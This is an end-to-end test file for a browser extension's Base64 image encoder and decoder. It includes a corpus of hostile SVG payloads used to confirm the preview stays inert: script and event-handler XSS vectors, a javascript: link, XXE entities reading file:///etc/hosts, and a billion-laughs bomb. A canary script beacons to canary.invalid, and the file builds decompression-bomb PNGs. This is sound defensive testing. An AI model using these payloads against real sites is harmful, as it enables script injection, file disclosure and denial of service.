// The Base64 Image tool in the built extension (docs/tools/specs/base64-image.md): its scenarios (§2) with the page's
// real controls, and what only Chrome can tell — run by scripts/e2e-tools.mjs. Names: 'Base64 Image: …'; screenshots
// tool-base64-image-NN-….
//
// - Showing someone else's image (§5 «Превью», §11), proved rather than assumed: the preview is `<img>` on an object URL
//   of a Blob of the recognised type; `data:` images are blocked by the page's policy; an SVG shown as an image runs no
//   script and loads nothing — the hostile set below (`hostileSvgs`), each pasted into Decode, with every request of the
//   browser context outside the extension's files recorded (Playwright and CDP), a canary a script would set (the
//   window, localStorage, chrome.storage, a request to canary.invalid, a navigation), the page's address, popups,
//   `securitypolicyviolation`, the longest frame, and the preview's pixels (an image the SVG names is not painted).
//   The same set under a NetLog with every name answered NOTFOUND is .state/base64-image/probe-netlog.mjs (outside the
//   repository): DNS is below what CDP shows.
// - Decoders as resource sinks: a header claiming 50,000 × 50,000 pixels and a 400-megapixel PNG of zeros are not
//   decoded (the tool's limit); a GIF of 3,000 frames plays without a long frame; a truncated file says so; a polyglot
//   is shown as the image its first bytes say and never runs.
// - Object URLs: every one the page creates is revoked on a new image, Clear, a change of direction and leaving.
// - §12: a 10 MiB photo both ways (encoding and decoding in the worker), the text field's own cost apart, Copy and
//   Save taking the 13.98 M characters whole, a paste over the limit stopped.
// - §7 on the start page, history (D17), light and dark screenshots.
// Clipboards are stand-ins (stubClipboard, and one for `clipboard.write`), put back before the module ends. Every
// remote address is a reserved name (*.invalid), answered by a route: even a failure reaches no network.
// Navigates by replacing the current history entry (Chrome keeps 50 per tab).

/* global document, window, location, chrome, requestAnimationFrame, HTMLTextAreaElement, DataTransfer, ClipboardEvent,
   DragEvent, Image, OffscreenCanvas, createImageBitmap -- page.evaluate callbacks run in the pages */

import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { deflateSync } from 'node:zlib';
import { historyRecords, inDarkTheme, settledShot, stubClipboard, waitForHistoryRecord } from '../e2e-helpers.mjs';

const T = 'Base64 Image';
const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../..');
const OUT = join(ROOT, '.state/e2e/base64-image');
const INVALID = /^(?:https?|wss?):\/\/[^/?#]*\.invalid(?:[:/?#]|$)/;

/** What a script in an SVG would do if it ran: marks in the page, storage and the network, then a navigation. */
export const CANARY =
  "try{top.__b64Pwned=1;parent.__b64Pwned=1}catch(e){};window.__b64Pwned=1;try{localStorage.setItem('b64Pwned','1')}catch(e){};" +
  "try{chrome.storage.local.set({b64Pwned:1})}catch(e){};try{fetch('https://canary.invalid/fetch')}catch(e){};" +
  "try{navigator.sendBeacon('https://canary.invalid/beacon','x')}catch(e){};try{new Image().src='https://canary.invalid/img'}catch(e){};" +
  "try{top.location='https://canary.invalid/nav'}catch(e){}";

const RED_PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR42mP4z8AAAAMBAQD3A0FDAAAAAElFTkSuQmCC';
const svg = inner =>
  `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="10"><rect width="20" height="10" fill="#00ff00"/>${inner}</svg>`;
const b64 = text => Buffer.from(text).toString('base64');
const escapeXml = text => text.replaceAll('&', '&amp;').replaceAll('"', '&quot;').replaceAll('<', '&lt;');

/**
 * The hostile set: SVGs that would run, load or navigate if shown any other way than as an image. `id` is the
 * extension's id (for the entries that name its own files). `green`: the preview's pixel at (5, 5) must stay the
 * background's green — whatever the SVG names over it is not painted (an `<image>` that does not load is painted as
 * Chrome's broken-image glyph; those entries are compared with an unreachable address instead). `observe`: a pixel
 * recorded, not judged.
 */
export const hostileSvgs = id => [
  {
    name: 'scripts: inline, remote, the extension’s own file',
    svg: svg(
      `<script>${CANARY}</script><script href="https://script.invalid/a.js"/><script xlink:href="chrome-extension://${id}/theme-boot.js"/>`,
    ),
    green: true,
  },
  {
    name: 'event handlers: onload, onclick, SMIL onbegin and onend',
    svg: svg(
      `<rect width="1" height="1" onclick="${CANARY}" onmouseover="${CANARY}"/><animate attributeName="x" dur="1ms" onbegin="${CANARY}" onend="${CANARY}"/><set attributeName="opacity" to="1" begin="0s" onbegin="${CANARY}"/>`,
    ).replace('<svg ', `<svg onload="${CANARY}" `),
    green: true,
  },
  {
    name: '<foreignObject> with HTML: script, img, iframe, autofocus handler, meta refresh, stylesheet, video poster',
    svg: svg(
      `<foreignObject width="20" height="10"><div xmlns="http://www.w3.org/1999/xhtml"><script>${CANARY}</script><img src="https://fo-img.invalid/a.png" onerror="${CANARY}"/><iframe src="https://fo-frame.invalid/"></iframe><input autofocus="" onfocus="${CANARY}"/><meta http-equiv="refresh" content="0;url=https://fo-refresh.invalid/"/><link rel="stylesheet" href="https://fo-css.invalid/a.css"/><video poster="https://fo-poster.invalid/p.png"></video><object data="https://fo-object.invalid/o"></object><embed src="https://fo-embed.invalid/e"/></div></foreignObject>`,
    ),
    green: false,
  },
  {
    name: '<use>, <image>, <feImage> with remote addresses',
    svg: svg(
      `<use href="https://use.invalid/s.svg#a"/><use xlink:href="//use2.invalid/s.svg#b"/><image href="https://image.invalid/a.png" width="20" height="10"/><image xlink:href="//image2.invalid/b.png" width="20" height="10"/><filter id="f"><feImage href="https://feimage.invalid/c.png"/></filter><rect width="1" height="1" filter="url(#f)"/>`,
    ),
    // An <image> that does not load is painted as Chrome's broken-image glyph (the control below).
    green: false,
  },
  {
    name: 'data: references: a PNG, an SVG with a script and a remote image, a <use> of a data: SVG',
    svg: svg(
      `<image href="data:image/png;base64,${RED_PNG}" x="10" y="0" width="10" height="10"/><image href="data:image/svg+xml;base64,${b64(svg(`<script>${CANARY}</script><image href="https://inner-image.invalid/a.png" width="20" height="10"/>`))}" x="15" y="0" width="5" height="5"/><use href="data:image/svg+xml,${encodeURIComponent(svg('<g id="x"/>'))}#x"/>`,
    ),
    green: true,
    observe: { x: 15, y: 7 },
  },
  {
    name: 'CSS: @import, @font-face, fill, background, cursor, filter and mask by url()',
    svg: svg(
      `<style>@import url(https://import.invalid/a.css); @import "https://import2.invalid/b.css"; @font-face{font-family:f;src:url(https://font.invalid/f.woff2)} text{font-family:f} #p{fill:url(https://fill.invalid/p.svg#p)} svg{background-image:url(https://bg.invalid/a.png);cursor:url(https://cursor.invalid/c.cur),auto}</style><rect id="p" x="18" width="2" height="2"/><rect x="17" y="8" width="1" height="1" style="filter:url(https://filter.invalid/f.svg#f);mask:url(https://mask.invalid/m.svg#m)"/><text x="18" y="9" font-size="2">x</text>`,
    ),
    green: true,
  },
  {
    name: 'the extension’s own files: icon by chrome-extension: and by path, its page by <use>, its address',
    svg: svg(
      `<image href="chrome-extension://${id}/icons/icon-128.png" width="20" height="10"/><image href="/icons/icon-128.png" width="20" height="10"/><image href="icons/icon-128.png" width="20" height="10"/><use href="chrome-extension://${id}/src/app/index.html#x"/><image href="chrome-extension://${id}/src/app/index.html" width="20" height="10"/>`,
    ),
    // An <image> that does not load is painted as Chrome's broken-image glyph (the control below).
    green: false,
  },
  {
    name: 'animation that sets an address: <set> and <animate> of href',
    svg: svg(
      `<a><set attributeName="href" to="https://set.invalid/" begin="0s"/><text y="9" font-size="4">x</text></a><image width="20" height="10"><set attributeName="href" to="https://set-image.invalid/a.png" begin="0s"/></image><image width="20" height="10"><animate attributeName="xlink:href" values="https://anim.invalid/a.png;https://anim2.invalid/b.png" dur="0.1s" repeatCount="3"/></image>`,
    ),
    // An <image> that does not load is painted as Chrome's broken-image glyph (the control below).
    green: false,
  },
  {
    name: 'links: https: and javascript: (and a click on the preview)',
    svg: svg(
      `<a href="https://nav.invalid/" target="_top"><rect width="20" height="10" fill="#00ff00"/></a><a href="javascript:${escapeXml(CANARY)}"><rect x="19" width="1" height="1" fill="#00ff00"/></a>`,
    ),
    green: true,
    click: true,
  },
  {
    name: 'stylesheet processing instructions: XSLT and CSS',
    svg: `<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="https://xsl.invalid/a.xsl"?><?xml-stylesheet href="https://css-pi.invalid/a.css"?>${svg('')}`,
    green: true,
  },
  {
    name: 'external entities: SYSTEM by https: and file:, a parameter entity',
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://xxe.invalid/x"><!ENTITY file SYSTEM "file:///etc/hosts"><!ENTITY % pe SYSTEM "https://pe.invalid/x.dtd"> %pe;]>${svg('<text y="9" font-size="3">&xxe;&file;</text>')}`,
    green: true,
    maybeDamaged: true,
  },
  {
    name: 'an XML entity bomb (billion laughs, 10^9 expansions)',
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "lollollol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">${'bcdefghi'
      .split('')
      .map((c, i) => `<!ENTITY ${'cdefghij'[i]} "${`&${c};`.repeat(10)}">`)
      .join('')}]>${svg('<text y="9" font-size="3">&j;</text>')}`,
    green: false,
    maybeDamaged: true,
  },
];

// ---- Images made here (invented content only)
const crcTable = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});
const crc = bytes => {
  let c = 0xffffffff;
  for (const b of bytes) c = crcTable[(c ^ b) & 255] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
};
const pngChunk = (type, data) => {
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.length);
  const typed = Buffer.concat([Buffer.from(type), data]);
  const sum = Buffer.alloc(4);
  sum.writeUInt32BE(crc(typed));
  return Buffer.concat([length, typed, sum]);
};
/** A 1-bit grey PNG of zeros: a few kilobytes that decode to width × height pixels (`rows`: how many are written). */
const zeroPng = (width, height, rows = height) => {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 1;
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', deflateSync(Buffer.alloc((1 + Math.ceil(width / 8)) * rows), { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
};
/** A looping GIF of `frames` frames of w × h in three colours, `delay` hundredths of a second apart. */
const manyFrameGif = (frames, w, h, delay) => {
  const parts = [Buffer.from('GIF89a'), Buffer.from([w & 255, w >> 8, h & 255, h >> 8, 0xf1, 0, 0])];
  parts.push(Buffer.from([255, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255]));
  parts.push(Buffer.from([0x21, 0xff, 0x0b, ...Buffer.from('NETSCAPE2.0'), 3, 1, 0, 0, 0]));
  const frame = colour => {
    // 3-bit codes: a clear code every two pixels keeps the table from growing.
    const codes = [4];
    for (let n = 0; n < w * h; n++) {
      codes.push(colour);
      if (n % 2 === 1) codes.push(4);
    }
    codes.push(5);
    const bytes = [];
    let acc = 0;
    let bits = 0;
    for (const c of codes) {
      acc |= c << bits;
      bits += 3;
      while (bits >= 8) {
        bytes.push(acc & 255);
        acc >>= 8;
        bits -= 8;
      }
    }
    if (bits) bytes.push(acc & 255);
    const blocks = [];
    for (let i = 0; i < bytes.length; i += 255)
      blocks.push(Math.min(255, bytes.length - i), ...bytes.slice(i, i + 255));
    return Buffer.from([2, ...blocks, 0]);
  };
  const frameBytes = [0, 1, 2].map(frame);
  for (let f = 0; f < frames; f++) {
    parts.push(Buffer.from([0x21, 0xf9, 4, 0, delay & 255, delay >> 8, 0, 0]));
    parts.push(Buffer.from([0x2c, 0, 0, 0, 0, w & 255, w >> 8, h & 255, h >> 8, 0]));
    parts.push(frameBytes[f % 3]);
  }
  parts.push(Buffer.from([0x3b]));
  return Buffer.concat(parts);
};
/** The specification's sample.png (3 × 2: red, green, blue / white, black, grey). */
const SAMPLE_PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAMAAAACCAIAAAASFvFNAAAAFUlEQVR4nGP4z8DAAMH//4PohoYGAEfPB3vT+rJCAAAAAElFTkSuQmCC',
  'base64',
);

export default async ({ ctx, page, base, check, shoot, sleep, report }) => {
  rmSync(OUT, { recursive: true, force: true });
  mkdirSync(OUT, { recursive: true });
  const facts = (report.base64Image = {});
  const id = new URL(base).host;
  // (`new URL(…).origin` of a chrome-extension: address is "null" in Node: the scheme is not a special one.)
  const origin = `chrome-extension://${id}`;

  // ---- What leaves the extension, for the whole module (Playwright and CDP), and what is routed instead.
  const outside = [];
  const onRequest = request => {
    const url = request.url();
    if (!url.startsWith(origin) && !url.startsWith('blob:') && !url.startsWith('data:')) outside.push(url);
  };
  ctx.on('request', onRequest);
  const routed = [];
  await ctx.route(INVALID, route => {
    routed.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/plain', body: '' });
  });
  const cdp = await ctx.newCDPSession(page);
  await cdp.send('Network.enable');
  const cdpRequests = [];
  const onCdp = e => cdpRequests.push({ url: e.request.url, type: e.type, initiator: e.initiator?.type });
  cdp.on('Network.requestWillBeSent', onCdp);
  const popups = [];
  const onPopup = p => popups.push(p.url());
  ctx.on('page', onPopup);
  const workers = [];
  const onWorker = w => workers.push(w.url());
  page.on('worker', onWorker);

  // ---- Helpers
  const toolUrl = `${base}#/tools/base64-image`;
  const go = async url => {
    if (page.url().split('#')[0] === base.split('#')[0]) await page.evaluate(u => location.replace(u), url);
    else await page.goto(url);
    await page.waitForFunction(h => location.hash === h, new URL(url).hash, { timeout: 5_000 });
  };
  const radio = name => page.getByRole('radio', { name, exact: true });
  const button = name => page.getByRole('button', { name, exact: true });
  const decodeField = page.locator('#base64-image-input');
  const resultField = page.locator('#base64-image-result');
  const fact = name => page.locator(`[data-fact="${name}"]`).innerText();
  const notes = () => page.locator('[data-part="notes"] [data-slot="tool-message"]').allInnerTexts();
  const errorLine = async () =>
    (
      await page
        .locator('[data-part="error"]')
        .innerText()
        .catch(() => '')
    ).trim();
  const previewState = () =>
    page
      .locator('[data-preview]')
      .first()
      .getAttribute('data-preview')
      .catch(() => null);
  const settledPreview = async (timeout = 10_000) => {
    await page
      .waitForFunction(
        () => {
          const p = document.querySelector('[data-preview]');
          if (p && p.getAttribute('data-preview') !== 'loading') return true;
          return (document.querySelector('[data-part="error"]')?.textContent ?? '').trim() !== '';
        },
        null,
        { timeout },
      )
      .catch(() => {});
    return previewState();
  };
  /** The longest gap between frames while `fn` runs and `after` ms more. */
  const timed = async (fn, after = 300) => {
    await page.evaluate(() => {
      window.__b64Frames = { longest: 0, last: performance.now(), on: true };
      const tick = t => {
        const f = window.__b64Frames;
        if (!f?.on) return;
        f.longest = Math.max(f.longest, t - f.last);
        f.last = t;
        requestAnimationFrame(tick);
      };
      requestAnimationFrame(tick);
    });
    const t0 = Date.now();
    const value = await fn();
    const ms = Date.now() - t0;
    await sleep(after);
    const longest = await page.evaluate(() => {
      const f = window.__b64Frames;
      f.on = false;
      delete window.__b64Frames;
      return Math.round(f.longest);
    });
    return { value, ms, longest };
  };
  /** Decode's field set as a paste would set it (one input event). */
  const put = async text => {
    await page.evaluate(value => {
      const field = document.querySelector('#base64-image-input');
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(field, value);
      field.dispatchEvent(new Event('input', { bubbles: true }));
    }, text);
  };
  /** Drops (or pastes) files made of these bytes on the page, as a person's drop or ⌘V would hand them. */
  const hand = (how, files) =>
    page.evaluate(
      async ([way, list]) => {
        const dt = new DataTransfer();
        for (const [data, name, type] of list)
          dt.items.add(new File([Uint8Array.from(atob(data), c => c.charCodeAt(0))], name, { type }));
        if (way === 'drop') {
          const zone = document.querySelector('[data-slot="file-drop"]');
          zone.dispatchEvent(new DragEvent('dragenter', { dataTransfer: dt, bubbles: true, cancelable: true }));
          await new Promise(r => setTimeout(r, 50));
          const label = document.querySelector('[data-slot="file-drop"] span')?.textContent;
          zone.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
          return label;
        }
        const event = new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true });
        (document.activeElement ?? document.body).dispatchEvent(event);
        return event.defaultPrevented;
      },
      [how, files.map(([bytes, name, type]) => [Buffer.from(bytes).toString('base64'), name, type])],
    );
  /** The preview's pixel, drawn on a canvas from the `<img>` (an image of the page's own origin leaves it readable). */
  const pixel = (x, y) =>
    page.evaluate(
      ([px, py]) => {
        const img = document.querySelector('[data-preview] img');
        if (!img?.naturalWidth) return null;
        const canvas = new OffscreenCanvas(img.naturalWidth, img.naturalHeight);
        const g = canvas.getContext('2d');
        g.drawImage(img, 0, 0);
        try {
          return [...g.getImageData(px, py, 1, 1).data];
        } catch (e) {
          return String(e);
        }
      },
      [x, y],
    );
  const canaryState = () =>
    page.evaluate(async () => ({
      window: window.__b64Pwned ?? null,
      local: localStorage.getItem('b64Pwned'),
      storage: await new Promise(resolve => {
        try {
          chrome.storage.local.get('b64Pwned', r => resolve(r?.b64Pwned ?? null));
        } catch {
          resolve('unreadable');
        }
      }),
    }));

  // ---- §9 / D16: nothing of the tool on the start route; its field finds it by a keyword
  const tool = url => /\/assets\/(Base64ImageTool|codec\.worker)-[^/]+\.js$/.exec(url)?.[1] ?? null;
  {
    const start = await ctx.newPage();
    const loaded = [];
    start.on('request', r => tool(r.url()) && loaded.push(tool(r.url())));
    await start.goto(base);
    const field = start.getByRole('combobox', { name: 'Find a tool or search the web' });
    await field.waitFor();
    await start.waitForLoadState('networkidle');
    await field.fill('data uri');
    const first = (await start.getByRole('option').first().innerText()).split('\n')[0];
    check(
      `${T}: nothing of the tool on the start route; its field finds it by "data uri"`,
      loaded.length === 0 && first.includes(T),
      `loaded ${JSON.stringify(loaded)}; first row "${first}"`,
    );
    await start.close();
  }

  // ---- Open the tool
  const pageLoads = [];
  const onPageLoad = r => tool(r.url()) && pageLoads.push(tool(r.url()));
  page.on('request', onPageLoad);
  await go(toolUrl);
  await page.getByRole('heading', { name: T }).waitFor();
  // The page shows "Loading…" until the tool's history is open, which takes longer right after another tool's large records.
  await page.locator('[data-slot="file-drop"]').waitFor({ timeout: 30_000 });
  await page.evaluate(() => {
    window.__b64Violations = [];
    window.__b64ViolationListener = e => window.__b64Violations.push(`${e.violatedDirective} ${e.blockedURI}`);
    document.addEventListener('securitypolicyviolation', window.__b64ViolationListener);
  });
  // Every object URL the page makes and revokes from here on (put back at the end).
  await page.evaluate(() => {
    const created = new Set();
    window.__b64Urls = { created, all: [], create: URL.createObjectURL, revoke: URL.revokeObjectURL };
    URL.createObjectURL = blob => {
      const url = window.__b64Urls.create.call(URL, blob);
      created.add(url);
      window.__b64Urls.all.push(url);
      return url;
    };
    URL.revokeObjectURL = url => {
      created.delete(url);
      return window.__b64Urls.revoke.call(URL, url);
    };
  });
  const liveUrls = () => page.evaluate(() => [...window.__b64Urls.created]);
  await sleep(200);
  check(
    `${T}: listed in Tools; opening it loads its component and no worker`,
    pageLoads.includes('Base64ImageTool') &&
      !workers.some(w => w.includes('codec.worker')) &&
      (await page.getByRole('navigation', { name: 'Sections' }).getByRole('link', { name: T }).count()) === 1,
    JSON.stringify(pageLoads),
  );
  await settledShot(shoot, page, 'tool-base64-image-01-empty.png');

  const clipboard = await stubClipboard(page);
  // Copy image: a stand-in for clipboard.write that keeps the PNG it is given, put back at the end.
  await page.evaluate(() => {
    window.__b64Written = [];
    Object.defineProperty(navigator.clipboard, 'write', {
      configurable: true,
      value: async items => {
        for (const item of items)
          for (const type of item.types) {
            const blob = await item.getType(type);
            const bitmap = await createImageBitmap(blob);
            window.__b64Written.push({ type, size: blob.size, width: bitmap.width, height: bitmap.height });
            bitmap.close();
          }
      },
    });
  });

  // ---- §2.1: a 64 × 64 "logo.png" dropped, CSS url(), Copy
  const blank = await ctx.newPage();
  const logo = Buffer.from(
    await blank.evaluate(async () => {
      const canvas = new OffscreenCanvas(64, 64);
      const g = canvas.getContext('2d');
      g.fillStyle = '#3366cc';
      g.fillRect(0, 0, 64, 64);
      g.fillStyle = '#ffcc00';
      g.beginPath();
      g.arc(32, 32, 20, 0, Math.PI * 2);
      g.fill();
      const blob = await canvas.convertToBlob({ type: 'image/png' });
      return btoa(String.fromCharCode(...new Uint8Array(await blob.arrayBuffer())));
    }),
    'base64',
  );
  const dragLabel = await hand('drop', [[logo, 'logo.png', 'image/png']]);
  await page.locator('[data-encoded]').waitFor();
  await settledPreview();
  await page.getByLabel('Output').click();
  await page.getByRole('option', { name: 'CSS url()' }).click();
  const cssOut = await resultField.inputValue();
  await button('Copy').click();
  await button('Copied').waitFor({ timeout: 2_000 });
  const copiedCss = (await clipboard.copied()).at(-1);
  const logoSize = logo.length.toLocaleString('en-US');
  check(
    `${T}: §2.1 a dropped logo.png — preview, PNG 64 × 64, its size; CSS url() copied whole`,
    dragLabel === 'Drop the image here' &&
      (await previewState()) === 'image' &&
      (await fact('Type')) === 'PNG (image/png)' &&
      (await fact('Dimensions')) === '64 × 64' &&
      (await fact('Size')).startsWith(`${logoSize} bytes`) &&
      (await fact('File')) === 'logo.png' &&
      cssOut === `url("data:image/png;base64,${logo.toString('base64')}")` &&
      copiedCss === cssOut,
    `drag label "${dragLabel}"; ${await fact('Size')}; ${cssOut.slice(0, 48)}…`,
  );
  // §10 row 29: the PNG through blob:, its pixel read back through a canvas.
  await settledShot(shoot, page, 'tool-base64-image-02-encode.png');

  // ---- The file chooser: a JPEG named .png, a HEIC named photo.png (§2.7), 52 MB (§2.6)
  const fileInput = page.locator('input[type="file"]');
  const jpeg = Buffer.from(
    await blank.evaluate(async () => {
      const canvas = new OffscreenCanvas(800, 600);
      const g = canvas.getContext('2d');
      g.fillStyle = '#20a060';
      g.fillRect(0, 0, 800, 600);
      g.fillStyle = '#ffffff';
      g.fillRect(100, 100, 600, 400);
      const blob = await canvas.convertToBlob({ type: 'image/jpeg', quality: 0.9 });
      return btoa(String.fromCharCode(...new Uint8Array(await blob.arrayBuffer())));
    }),
    'base64',
  );
  await fileInput.setInputFiles({ name: 'avatar.png', mimeType: 'image/png', buffer: jpeg });
  await page.waitForFunction(() => document.querySelector('[data-fact="File"]')?.textContent === 'avatar.png');
  const renamed = { type: await fact('Type'), dims: await fact('Dimensions') };
  const heic = Buffer.concat([Buffer.from([0, 0, 0, 24]), Buffer.from('ftypheic\0\0\0\0mif1heic'), Buffer.alloc(64)]);
  await fileInput.setInputFiles({ name: 'photo.png', mimeType: 'image/png', buffer: heic });
  await page.locator('[data-part="error"]').waitFor();
  const heicLine = await errorLine();
  const hugePath = join(OUT, 'huge.png');
  writeFileSync(hugePath, Buffer.alloc(54_525_952));
  const t52 = Date.now();
  await fileInput.setInputFiles(hugePath);
  await page.getByText(/^The image is 54,525,952 bytes/).waitFor();
  const refusedMs = Date.now() - t52;
  check(
    `${T}: by the bytes, not the name — a JPEG named .png is JPEG 800 × 600; a HEIC named photo.png is refused (§2.7); 52 MB refused by its size (§2.6)`,
    renamed.type === 'JPEG (image/jpeg)' &&
      renamed.dims === '800 × 600' &&
      heicLine === 'HEIC images cannot be shown by Chrome; this tool does not accept them.' &&
      (await errorLine()) === 'The image is 54,525,952 bytes (52.0 MiB). This tool works with images up to 10 MiB.',
    `${JSON.stringify(renamed)}; "${heicLine}"; 52 MB refused in ${refusedMs} ms (the file handed over included)`,
  );

  // ---- §2.3: an image pasted (a stand-in ⌘V carrying a File) while in Decode switches to Encode
  await radio('Decode').click();
  await decodeField.focus();
  const pastePrevented = await hand('paste', [[SAMPLE_PNG, 'image.png', 'image/png']]);
  await page.locator('[data-encoded]').waitFor();
  await page.waitForFunction(() => document.querySelector('[data-fact="Dimensions"]')?.textContent === '3 × 2');
  await page.getByLabel('Output').click();
  await page.getByRole('option', { name: 'Data URI' }).click();
  check(
    `${T}: §2.3 a pasted image switches to Encode and shows its data URI (the paste kept from the field)`,
    pastePrevented === true &&
      (await radio('Encode').getAttribute('aria-checked')) === 'true' &&
      (await resultField.inputValue()) === `data:image/png;base64,${SAMPLE_PNG.toString('base64')}`,
  );
  const red = await pixel(0, 0);
  check(
    `${T}: §10 row 29 — the PNG through blob: loads, 3 × 2, pixel (0, 0) is 255,0,0,255 through a canvas`,
    JSON.stringify(red) === '[255,0,0,255]' &&
      (await page.locator('[data-preview] img').getAttribute('src')).startsWith(`blob:${origin}/`),
    JSON.stringify(red),
  );

  // ---- §2.2 and §2.4: Decode a JPEG; declared PNG; Save image saves image.jpg
  const download = async name => {
    const [file] = await Promise.all([page.waitForEvent('download'), button(name).click()]);
    const path = join(OUT, file.suggestedFilename());
    await file.saveAs(path);
    return { name: file.suggestedFilename(), bytes: readFileSync(path), url: file.url() };
  };
  await radio('Decode').click();
  await put(jpeg.toString('base64'));
  await settledPreview();
  const savedJpeg = await download('Save image');
  check(
    `${T}: §2.2 Base64 of a JPEG — preview, JPEG 800 × 600; Save image saves image.jpg, the same bytes, from a blob: URL`,
    (await previewState()) === 'image' &&
      (await fact('Dimensions')) === '800 × 600' &&
      savedJpeg.name === 'image.jpg' &&
      savedJpeg.bytes.equals(jpeg) &&
      savedJpeg.url.startsWith('blob:'),
    `${savedJpeg.name}, ${savedJpeg.bytes.length} bytes, ${savedJpeg.url.slice(0, 40)}`,
  );
  await put(`data:image/png;base64,${jpeg.toString('base64')}`);
  // The preview of the same bytes is already settled; the note is what says the new input has been read.
  await page
    .locator('[data-part="notes"] [data-slot="tool-message"]')
    .first()
    .waitFor({ timeout: 10_000 })
    .catch(() => {});
  await settledPreview();
  const mismatch = await notes();
  const savedMismatch = await download('Save image');
  await button('Copy data URI').click();
  const copiedUri = (await clipboard.copied()).at(-1);
  await button('Copy image').click();
  await page.waitForFunction(() => window.__b64Written.length > 0, null, { timeout: 5_000 }).catch(() => {});
  const written = await page.evaluate(() => window.__b64Written.at(-1));
  check(
    `${T}: §2.4 data:image/png of JPEG bytes — the warning, Save image as image.jpg; Copy data URI with image/jpeg; Copy image hands over a PNG of 800 × 600`,
    mismatch.includes('Declared image/png, but the bytes are JPEG.') &&
      savedMismatch.name === 'image.jpg' &&
      copiedUri === `data:image/jpeg;base64,${jpeg.toString('base64')}` &&
      written?.type === 'image/png' &&
      written.width === 800 &&
      written.height === 600 &&
      (await button('Copied').count()) === 2,
    `${JSON.stringify(mismatch)}; ${JSON.stringify(written)}`,
  );
  await settledShot(shoot, page, 'tool-base64-image-03-decode-warning.png');

  // ---- §10 rows 30, 32–35: Chrome's own answers on a page of the extension (same policy), outside the tool
  {
    // The blocked data: image below is an error Chrome records for the extension: the run's last check is told.
    (report.expectedRuntimeErrors ??= []).push(
      `Loading the image 'data:image/png;base64,${SAMPLE_PNG.toString('base64')}' violates`,
    );
    const probe = await ctx.newPage();
    await probe.goto(`${base}#/tools`);
    await probe.getByRole('heading').first().waitFor();
    const rows = await probe.evaluate(
      async ([pngB64, svgText]) => {
        const png = Uint8Array.from(atob(pngB64), c => c.charCodeAt(0));
        const violations = [];
        document.addEventListener('securitypolicyviolation', e => violations.push(e.violatedDirective));
        const load = src =>
          new Promise(resolve => {
            const img = new Image();
            img.onload = () => resolve(`load ${img.naturalWidth}x${img.naturalHeight}`);
            img.onerror = () => resolve('error');
            img.src = src;
          });
        const out = {};
        out.dataUri = await load(`data:image/png;base64,${pngB64}`);
        await new Promise(r => setTimeout(r, 100));
        out.dataViolations = [...violations];
        out.svgAsPng = await load(URL.createObjectURL(new Blob([svgText], { type: 'image/png' })));
        out.pngUntyped = await load(URL.createObjectURL(new Blob([png])));
        out.svgBitmap = await createImageBitmap(new Blob([svgText], { type: 'image/svg+xml' })).then(
          () => 'decoded',
          e => e.name,
        );
        const revoked = URL.createObjectURL(new Blob([png], { type: 'image/png' }));
        URL.revokeObjectURL(revoked);
        out.revoked = await load(revoked);
        out.truncated = await load(URL.createObjectURL(new Blob([png.subarray(0, 40)], { type: 'image/png' })));
        return out;
      },
      [SAMPLE_PNG.toString('base64'), svg('<script>1</script>')],
    );
    facts.chromeRows = rows;
    check(
      `${T}: §10 rows 30, 32–35 — data: blocked by img-src; SVG in a Blob typed image/png does not load; an untyped PNG does; createImageBitmap refuses SVG; a revoked URL and a truncated PNG fail`,
      rows.dataUri === 'error' &&
        rows.dataViolations.includes('img-src') &&
        rows.svgAsPng === 'error' &&
        rows.pngUntyped === 'load 3x2' &&
        rows.svgBitmap === 'InvalidStateError' &&
        rows.revoked === 'error' &&
        rows.truncated === 'error',
      JSON.stringify(rows),
    );
    await probe.close();
  }

  // ---- §10 rows 35–36 through the tool: a truncated PNG keeps its facts and Save; sample.png saves as image.png
  await put(SAMPLE_PNG.subarray(0, 40).toString('base64'));
  const truncatedState = await settledPreview();
  const damagedLine = await page.getByText('The image could not be shown: the data may be damaged.').count();
  const truncatedFacts = [await fact('Dimensions'), await fact('Size')];
  const truncatedSave = await download('Save image');
  await put(`data:image/png;base64,${SAMPLE_PNG.toString('base64')}`);
  await settledPreview();
  const sampleSave = await download('Save image');
  check(
    `${T}: §10 rows 35–36 — a truncated PNG: "could not be shown", facts 3 × 2, 40 bytes, Save works; sample.png saves as image.png, 78 bytes`,
    truncatedState === 'damaged' &&
      damagedLine === 1 &&
      truncatedFacts.join() === '3 × 2,40 bytes' &&
      truncatedSave.bytes.length === 40 &&
      sampleSave.name === 'image.png' &&
      sampleSave.bytes.length === 78,
    `${truncatedState}; ${truncatedSave.name} ${truncatedSave.bytes.length} B; ${sampleSave.name} ${sampleSave.bytes.length} B`,
  );

  // ---- The hostile set (§2.5, §11): each SVG pasted into Decode as Base64, then as a data: URI
  const corpus = hostileSvgs(id);
  const hostile = [];
